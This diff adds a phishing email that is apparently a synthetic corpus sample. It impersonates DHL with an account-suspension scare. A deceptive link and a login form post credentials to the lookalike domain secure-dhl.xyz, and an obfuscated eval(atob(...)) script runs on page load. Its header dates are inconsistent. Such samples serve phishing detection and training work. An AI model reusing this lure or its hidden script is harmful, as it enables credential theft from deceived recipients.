@@ -1,0 +1,35 @@
+From: notice@secure-dhl.xyz
+To: victim50@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 22 Mar 2002 21:37:00 -0500
+Message-ID: <phish-230-5740a3bc-3362-4f54-a331-6ea698290826@secure-dhl.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 20 Mar 2002 22:53:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 19 Mar 2002 10:12:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 03 Mar 2002 15:09:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 23 Mar 2002 16:08:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 18 Mar 2002 10:40:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 25 Mar 2002 13:03:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 28 Mar 2002 07:57:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 24 Mar 2002 07:47:00 -0500
+Return-Path: <bounce@mail-8244a2bd.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-8244a2bd.top; dkim=fail header.d=secure-dhl.xyz; dmarc=fail header.from=secure-dhl.xyz
+Received-SPF: fail (mx.example.com: domain of notice@secure-dhl.xyz does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-dhl.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-230-62100b4d"
+
+--bnd-p-230-62100b4d
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://secure-dhl.xyz/login
+
+Reference: PD75506
+--bnd-p-230-62100b4d
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://secure-dhl.xyz/login<br/><br/>Reference: PD75506</p><p><a href="http://secure-dhl.xyz/login">https://www.dhl.com/signin</a></p><form action="http://secure-dhl.xyz/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-230-62100b4d--
